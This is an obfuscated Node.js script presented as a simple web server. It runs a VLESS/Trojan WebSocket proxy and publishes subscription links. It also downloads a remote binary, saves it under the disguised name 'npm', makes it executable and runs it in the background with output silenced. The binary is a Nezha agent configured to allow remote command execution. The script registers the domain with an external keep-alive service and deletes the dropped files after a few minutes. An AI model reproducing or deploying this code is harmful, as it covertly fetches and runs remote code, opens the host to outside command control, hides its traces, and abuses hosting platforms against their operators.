const _0x3cb413=_0x52e0;(function(_0x4088b1,_0x1f7d12){const _0x1a9260=_0x52e0,_0x5b2937=_0x4088b1();while(!![]){try{const _0x5ce2fe=parseInt(_0x1a9260(0xef))/0x1*(parseInt(_0x1a9260(0xde))/0x2)+parseInt(_0x1a9260(0x8f))/0x3*(parseInt(_0x1a9260(0x104))/0x4)+-parseInt(_0x1a9260(0xcb))/0x5+-parseInt(_0x1a9260(0xa1))/0x6*(parseInt(_0x1a9260(0xdc))/0x7)+-parseInt(_0x1a9260(0xaa))/0x8+parseInt(_0x1a9260(0xd7))/0x9*(-parseInt(_0x1a9260(0x98))/0xa)+parseInt(_0x1a9260(0x90))/0xb;if(_0x5ce2fe===_0x1f7d12)break;else _0x5b2937['push'](_0x5b2937['shift']());}catch(_0x257c0f){_0x5b2937['push'](_0x5b2937['shift']());}}}(_0x5521,0x45c59));const os=require('os'),http=require(_0x3cb413(0x100)),fs=require('fs'),axios=require(_0x3cb413(0x99)),net=require(_0x3cb413(0x8b)),path=require('path'),crypto=require(_0x3cb413(0xe6)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x3cb413(0xc0)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3cb413(0xd3)]||_0x3cb413(0xa3),NEZHA_SERVER=process[_0x3cb413(0xac)][_0x3cb413(0xa7)]||'',NEZHA_PORT=process[_0x3cb413(0xac)][_0x3cb413(0xb6)]||'',NEZHA_KEY=process[_0x3cb413(0xac)]['NEZHA_KEY']||'',DOMAIN=process[_0x3cb413(0xac)][_0x3cb413(0x102)]||'1234.abc.com',AUTO_ACCESS=process[_0x3cb413(0xac)][_0x3cb413(0xc6)]||!![],WSPATH=process[_0x3cb413(0xac)]['WSPATH']||UUID[_0x3cb413(0xa0)](0x0,0x8),SUB_PATH=process[_0x3cb413(0xac)][_0x3cb413(0xdb)]||_0x3cb413(0xc3),NAME=process[_0x3cb413(0xac)][_0x3cb413(0xbd)]||_0x3cb413(0xeb),PORT=process[_0x3cb413(0xac)][_0x3cb413(0xc4)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x16d210=_0x3cb413;try{const _0x2ffe07=await axios[_0x16d210(0xab)](_0x16d210(0x9f)),_0x2e7c8d=_0x2ffe07[_0x16d210(0xc7)];ISP=(_0x2e7c8d['country']+'-'+_0x2e7c8d['asOrganization'])['replace'](/ /g,'_');}catch(_0x6397fb){ISP=_0x16d210(0xbc);}};GetISP();const httpServer=http[_0x3cb413(0xc8)]((_0x88291,_0x4f3b46)=>{const _0x351354=_0x3cb413;if(_0x88291['url']==='/'){const _0x5d678c=path[_0x351354(0xd0)](__dirname,_0x351354(0xb8));fs['readFile'](_0x5d678c,_0x351354(0xd5),(_0x2c9c52,_0x3139fc)=>{const _0x191617=_0x351354;if(_0x2c9c52){_0x4f3b46[_0x191617(0xb4)](0xc8,{'Content-Type':_0x191617(0xe9)}),_0x4f3b46['end']('Hello\x20world!');return;}_0x4f3b46[_0x191617(0xb4)](0xc8,{'Content-Type':_0x191617(0xe9)}),_0x4f3b46[_0x191617(0x93)](_0x3139fc);});return;}else{if(_0x88291[_0x351354(0x94)]==='/'+SUB_PATH){const _0x314b78=_0x351354(0xe3)+UUID+'@'+DOMAIN+_0x351354(0x103)+DOMAIN+_0x351354(0xce)+DOMAIN+_0x351354(0x88)+WSPATH+'#'+NAME+'-'+ISP,_0x4d201e=_0x351354(0xe2)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x351354(0xce)+DOMAIN+_0x351354(0x88)+WSPATH+'#'+NAME+'-'+ISP,_0x2b347c=_0x314b78+'\x0a'+_0x4d201e,_0x1e749a=Buffer['from'](_0x2b347c)[_0x351354(0xcd)](_0x351354(0xb2));_0x4f3b46['writeHead'](0xc8,{'Content-Type':_0x351354(0x8c)}),_0x4f3b46['end'](_0x1e749a+'\x0a');}else _0x4f3b46[_0x351354(0xb4)](0x194,{'Content-Type':'text/plain'}),_0x4f3b46[_0x351354(0x93)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x3cb413(0x96))]({'server':httpServer}),uuid=UUID[_0x3cb413(0xf3)](/-/g,''),DNS_SERVERS=[_0x3cb413(0xf0),_0x3cb413(0xea)];function resolveHost(_0x3d2628){return new Promise((_0x1a53da,_0xa275a)=>{const _0x5dc0c2=_0x52e0;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5dc0c2(0xd9)](_0x3d2628)){_0x1a53da(_0x3d2628);return;}let _0x51b214=0x0;function _0x599682(){const _0x3bb916=_0x5dc0c2;if(_0x51b214>=DNS_SERVERS[_0x3bb916(0xe5)]){_0xa275a(new Error('Failed\x20to\x20resolve\x20'+_0x3d2628+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x25b9c6=DNS_SERVERS[_0x51b214];_0x51b214++;const _0x230821=_0x3bb916(0xa5)+encodeURIComponent(_0x3d2628)+'&type=A';axios['get'](_0x230821,{'timeout':0x1388,'headers':{'Accept':_0x3bb916(0xed)}})['then'](_0x5dec33=>{const _0x47bd68=_0x3bb916,_0x5bad9c=_0x5dec33[_0x47bd68(0xc7)];if(_0x5bad9c[_0x47bd68(0xda)]===0x0&&_0x5bad9c['Answer']&&_0x5bad9c[_0x47bd68(0xa8)][_0x47bd68(0xe5)]>0x0){const _0x3aecfe=_0x5bad9c[_0x47bd68(0xa8)][_0x47bd68(0xfd)](_0x958610=>_0x958610[_0x47bd68(0xf5)]===0x1);if(_0x3aecfe){_0x1a53da(_0x3aecfe[_0x47bd68(0xc7)]);return;}}_0x599682();})[_0x3bb916(0xdf)](_0x5ece27=>{_0x599682();});}_0x599682();});}function handleVlessConnection(_0x5929ce,_0x19fc2b){const _0x2cc4bf=_0x3cb413,[_0x190dc8]=_0x19fc2b,_0x1fa00b=_0x19fc2b['slice'](0x1,0x11);if(!_0x1fa00b[_0x2cc4bf(0xd8)]((_0x3e3a4d,_0x2843cc)=>_0x3e3a4d==parseInt(uuid[_0x2cc4bf(0xfa)](_0x2843cc*0x2,0x2),0x10)))return![];let _0x3e37b0=_0x19fc2b[_0x2cc4bf(0xa0)](0x11,0x12)['readUInt8']()+0x13;const _0x49d94a=_0x19fc2b[_0x2cc4bf(0xa0)](_0x3e37b0,_0x3e37b0+=0x2)[_0x2cc4bf(0xb9)](0x0),_0x245147=_0x19fc2b[_0x2cc4bf(0xa0)](_0x3e37b0,_0x3e37b0+=0x1)['readUInt8'](),_0x514d6b=_0x245147==0x1?_0x19fc2b[_0x2cc4bf(0xa0)](_0x3e37b0,_0x3e37b0+=0x4)['join']('.'):_0x245147==0x2?new TextDecoder()[_0x2cc4bf(0xf7)](_0x19fc2b[_0x2cc4bf(0xa0)](_0x3e37b0+0x1,_0x3e37b0+=0x1+_0x19fc2b['slice'](_0x3e37b0,_0x3e37b0+0x1)[_0x2cc4bf(0xc2)]())):_0x245147==0x3?_0x19fc2b['slice'](_0x3e37b0,_0x3e37b0+=0x10)[_0x2cc4bf(0x85)]((_0x4fc197,_0x3c6f73,_0x4e6c31,_0x1a6602)=>_0x4e6c31%0x2?_0x4fc197[_0x2cc4bf(0xb0)](_0x1a6602[_0x2cc4bf(0xa0)](_0x4e6c31-0x1,_0x4e6c31+0x1)):_0x4fc197,[])[_0x2cc4bf(0xbe)](_0x3e1629=>_0x3e1629[_0x2cc4bf(0xb9)](0x0)[_0x2cc4bf(0xcd)](0x10))[_0x2cc4bf(0xd0)](':'):'';_0x5929ce[_0x2cc4bf(0x9c)](new Uint8Array([_0x190dc8,0x0]));const _0x1eb38b=createWebSocketStream(_0x5929ce);return resolveHost(_0x514d6b)[_0x2cc4bf(0x92)](_0x4337e0=>{const _0x3f8943=_0x2cc4bf;net[_0x3f8943(0x9d)]({'host':_0x4337e0,'port':_0x49d94a},function(){const _0x5880fd=_0x3f8943;this['write'](_0x19fc2b[_0x5880fd(0xa0)](_0x3e37b0)),_0x1eb38b['on'](_0x5880fd(0x86),()=>{})[_0x5880fd(0xbb)](this)['on']('error',()=>{})[_0x5880fd(0xbb)](_0x1eb38b);})['on'](_0x3f8943(0x86),()=>{});})[_0x2cc4bf(0xdf)](_0x11321f=>{const _0x51c6ae=_0x2cc4bf;net[_0x51c6ae(0x9d)]({'host':_0x514d6b,'port':_0x49d94a},function(){const _0x36096a=_0x51c6ae;this[_0x36096a(0x9e)](_0x19fc2b[_0x36096a(0xa0)](_0x3e37b0)),_0x1eb38b['on'](_0x36096a(0x86),()=>{})[_0x36096a(0xbb)](this)['on']('error',()=>{})['pipe'](_0x1eb38b);})['on'](_0x51c6ae(0x86),()=>{});}),!![];}function handleTrojanConnection(_0xc04078,_0x109425){const _0x48411f=_0x3cb413;try{if(_0x109425[_0x48411f(0xe5)]<0x3a)return![];const _0x349a39=_0x109425[_0x48411f(0xa0)](0x0,0x38)['toString'](),_0x19d852=[UUID];let _0x1889ea=null;for(const _0x1850aa of _0x19d852){const _0x51d143=crypto[_0x48411f(0xf6)](_0x48411f(0xe4))[_0x48411f(0xc5)](_0x1850aa)[_0x48411f(0xe0)](_0x48411f(0xa2));if(_0x51d143===_0x349a39){_0x1889ea=_0x1850aa;break;}}if(!_0x1889ea)return![];let _0x2c26b6=0x38;_0x109425[_0x2c26b6]===0xd&&_0x109425[_0x2c26b6+0x1]===0xa&&(_0x2c26b6+=0x2);const _0x5c6024=_0x109425[_0x2c26b6];if(_0x5c6024!==0x1)return![];_0x2c26b6+=0x1;const _0x2d186a=_0x109425[_0x2c26b6];_0x2c26b6+=0x1;let _0x2f616a,_0x1df686;if(_0x2d186a===0x1)_0x2f616a=_0x109425[_0x48411f(0xa0)](_0x2c26b6,_0x2c26b6+0x4)[_0x48411f(0xd0)]('.'),_0x2c26b6+=0x4;else{if(_0x2d186a===0x3){const _0x35bac4=_0x109425[_0x2c26b6];_0x2c26b6+=0x1,_0x2f616a=_0x109425[_0x48411f(0xa0)](_0x2c26b6,_0x2c26b6+_0x35bac4)[_0x48411f(0xcd)](),_0x2c26b6+=_0x35bac4;}else{if(_0x2d186a===0x4)_0x2f616a=_0x109425['slice'](_0x2c26b6,_0x2c26b6+0x10)[_0x48411f(0x85)]((_0x1e1562,_0x574065,_0x3fc02c,_0xef9672)=>_0x3fc02c%0x2?_0x1e1562[_0x48411f(0xb0)](_0xef9672[_0x48411f(0xa0)](_0x3fc02c-0x1,_0x3fc02c+0x1)):_0x1e1562,[])[_0x48411f(0xbe)](_0x263b01=>_0x263b01['readUInt16BE'](0x0)[_0x48411f(0xcd)](0x10))['join'](':'),_0x2c26b6+=0x10;else return![];}}_0x1df686=_0x109425[_0x48411f(0xb9)](_0x2c26b6),_0x2c26b6+=0x2;_0x2c26b6<_0x109425[_0x48411f(0xe5)]&&_0x109425[_0x2c26b6]===0xd&&_0x109425[_0x2c26b6+0x1]===0xa&&(_0x2c26b6+=0x2);const _0x3dd3c7=createWebSocketStream(_0xc04078);return resolveHost(_0x2f616a)[_0x48411f(0x92)](_0x38ab25=>{const _0x1e7fa6=_0x48411f;net[_0x1e7fa6(0x9d)]({'host':_0x38ab25,'port':_0x1df686},function(){const _0x3e9bbf=_0x1e7fa6;_0x2c26b6<_0x109425[_0x3e9bbf(0xe5)]&&this['write'](_0x109425['slice'](_0x2c26b6)),_0x3dd3c7['on'](_0x3e9bbf(0x86),()=>{})[_0x3e9bbf(0xbb)](this)['on'](_0x3e9bbf(0x86),()=>{})[_0x3e9bbf(0xbb)](_0x3dd3c7);})['on']('error',()=>{});})[_0x48411f(0xdf)](_0x46fec2=>{const _0x5d109e=_0x48411f;net[_0x5d109e(0x9d)]({'host':_0x2f616a,'port':_0x1df686},function(){const _0x2213d4=_0x5d109e;_0x2c26b6<_0x109425[_0x2213d4(0xe5)]&&this[_0x2213d4(0x9e)](_0x109425[_0x2213d4(0xa0)](_0x2c26b6)),_0x3dd3c7['on'](_0x2213d4(0x86),()=>{})[_0x2213d4(0xbb)](this)['on'](_0x2213d4(0x86),()=>{})[_0x2213d4(0xbb)](_0x3dd3c7);})['on'](_0x5d109e(0x86),()=>{});}),!![];}catch(_0x50b0c3){return![];}}function _0x52e0(_0x42bfe7,_0x1e9280){const _0x552171=_0x5521();return _0x52e0=function(_0x52e09c,_0xeb284e){_0x52e09c=_0x52e09c-0x85;let _0x2d63f3=_0x552171[_0x52e09c];return _0x2d63f3;},_0x52e0(_0x42bfe7,_0x1e9280);}function _0x5521(){const _0x53a66e=['map','utf-8','child_process','post','readUInt8','sub','PORT','update','AUTO_ACCESS','data','createServer','chmod\x20+x\x20npm','arm','981430ZYuovn','trim','toString','&fp=chrome&type=ws&host=','2087','join','pop','npm','UUID','false','utf8','2083','18uNZAuI','every','test','Status','SUB_PATH','77pFGyIx','config.yaml','2qXwczh','catch','digest','npm\x20download\x20successfully','trojan://','vless://','sha224','length','crypto','error:\x20','npm\x20is\x20running','text/html','1.1.1.1','Hug','\x20-p\x20','application/dns-json','8443','73753avvEne','8.8.4.4','once','Automatic\x20Access\x20Task\x20added\x20successfully','replace','message','type','createHash','decode','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','arch','substr','/bin/bash','log','find','client_secret:\x20','connection','http','aarch64','DOMAIN',':443?encryption=none&security=tls&sni=','20kpkYgs','reduce','error','setsid\x20nohup\x20./npm\x20-s\x20','&path=%2F','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','includes','net','text/plain','https://amd64.ssss.nyc.mn/agent','unlink','339303FxHZej','11408232pTMycp','close','then','end','url','split','Server','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2586230NPfDLx','axios','https://','Server\x20is\x20running\x20on\x20port\x20','send','connect','write','https://speed.cloudflare.com/meta','slice','220518JUPSqX','hex','a2142531-47b9-415a-90fa-4c7cdf104766','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://dns.google/resolve?name=','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA_SERVER','Answer','finish','2182160CpkDnU','get','env','2096','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','--tls','concat','https://arm64.ssss.nyc.mn/agent','base64','https://oooo.serv00.net/add-url','writeHead','npm\x20running\x20error:','NEZHA_PORT','2053','index.html','readUInt16BE','listen','pipe','Unknown','NAME'];_0x5521=function(){return _0x53a66e;};return _0x5521();}wss['on'](_0x3cb413(0xff),(_0x53bdb7,_0x4e47d6)=>{const _0x1f09c2=_0x3cb413,_0x3e1212=_0x4e47d6['url']||'';_0x53bdb7[_0x1f09c2(0xf1)](_0x1f09c2(0xf4),_0x10aa42=>{const _0x190784=_0x1f09c2;if(_0x10aa42['length']>0x11&&_0x10aa42[0x0]===0x0){const _0x270c39=_0x10aa42[_0x190784(0xa0)](0x1,0x11),_0x26dff0=_0x270c39[_0x190784(0xd8)]((_0x8bb321,_0xb6fd50)=>_0x8bb321==parseInt(uuid[_0x190784(0xfa)](_0xb6fd50*0x2,0x2),0x10));if(_0x26dff0){!handleVlessConnection(_0x53bdb7,_0x10aa42)&&_0x53bdb7[_0x190784(0x91)]();return;}}!handleTrojanConnection(_0x53bdb7,_0x10aa42)&&_0x53bdb7[_0x190784(0x91)]();})['on'](_0x1f09c2(0x86),()=>{});});const getDownloadUrl=()=>{const _0x8308b5=_0x3cb413,_0x3c9a86=os[_0x8308b5(0xf9)]();return _0x3c9a86===_0x8308b5(0xca)||_0x3c9a86==='arm64'||_0x3c9a86===_0x8308b5(0x101)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x8308b5(0xb1):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x8308b5(0x8d);},downloadFile=async()=>{const _0x328e30=_0x3cb413;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x40dcae=getDownloadUrl(),_0x16cdc6=await axios({'method':_0x328e30(0xab),'url':_0x40dcae,'responseType':'stream'}),_0x1f8f09=fs['createWriteStream'](_0x328e30(0xd2));return _0x16cdc6[_0x328e30(0xc7)]['pipe'](_0x1f8f09),new Promise((_0x3e0506,_0x49a265)=>{const _0x5eb61c=_0x328e30;_0x1f8f09['on'](_0x5eb61c(0xa9),()=>{const _0x188064=_0x5eb61c;console[_0x188064(0xfc)](_0x188064(0xe1)),exec(_0x188064(0xc9),_0x1e8f14=>{if(_0x1e8f14)_0x49a265(_0x1e8f14);_0x3e0506();});}),_0x1f8f09['on'](_0x5eb61c(0x86),_0x49a265);});}catch(_0x62fbc9){throw _0x62fbc9;}},runnz=async()=>{const _0xe5e1d8=_0x3cb413;try{const _0x4106c0=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0xe5e1d8(0xbf)});if(_0x4106c0[_0xe5e1d8(0xcc)]()!==''){console[_0xe5e1d8(0xfc)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x34408e){}await downloadFile();let _0x555378='',_0x2a538a=['443',_0xe5e1d8(0xee),_0xe5e1d8(0xad),_0xe5e1d8(0xcf),_0xe5e1d8(0xd6),_0xe5e1d8(0xb7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x18be20=_0x2a538a['includes'](NEZHA_PORT)?_0xe5e1d8(0xaf):'';_0x555378=_0xe5e1d8(0x87)+NEZHA_SERVER+':'+NEZHA_PORT+_0xe5e1d8(0xec)+NEZHA_KEY+'\x20'+_0x18be20+_0xe5e1d8(0xf8);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x312818=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0xe5e1d8(0x95)](':')[_0xe5e1d8(0xd1)]():'',_0x1aec48=_0x2a538a[_0xe5e1d8(0x8a)](_0x312818)?'true':_0xe5e1d8(0xd4),_0x5206ff=_0xe5e1d8(0xfe)+NEZHA_KEY+_0xe5e1d8(0xae)+NEZHA_SERVER+_0xe5e1d8(0xa6)+_0x1aec48+_0xe5e1d8(0x97)+UUID;fs['writeFileSync'](_0xe5e1d8(0xdd),_0x5206ff);}_0x555378=_0xe5e1d8(0xa4);}else{console['log'](_0xe5e1d8(0x89));return;}}try{exec(_0x555378,{'shell':_0xe5e1d8(0xfb)},_0x10b58e=>{const _0x528249=_0xe5e1d8;if(_0x10b58e)console[_0x528249(0x86)](_0x528249(0xb5),_0x10b58e);else console[_0x528249(0xfc)](_0x528249(0xe8));});}catch(_0x3f5ca8){console[_0xe5e1d8(0x86)](_0xe5e1d8(0xe7)+_0x3f5ca8);}};async function addAccessTask(){const _0x529fc2=_0x3cb413;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x378ecc=_0x529fc2(0x9a)+DOMAIN;try{const _0x2abe96=await axios[_0x529fc2(0xc1)](_0x529fc2(0xb3),{'url':_0x378ecc},{'headers':{'Content-Type':'application/json'}});console['log'](_0x529fc2(0xf2));}catch(_0x3943bd){}}const delFiles=()=>{const _0x2b3267=_0x3cb413;fs[_0x2b3267(0x8e)]('npm',()=>{}),fs[_0x2b3267(0x8e)](_0x2b3267(0xdd),()=>{});};httpServer[_0x3cb413(0xba)](PORT,()=>{const _0x1fee87=_0x3cb413;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1fee87(0xfc)](_0x1fee87(0x9b)+PORT);});
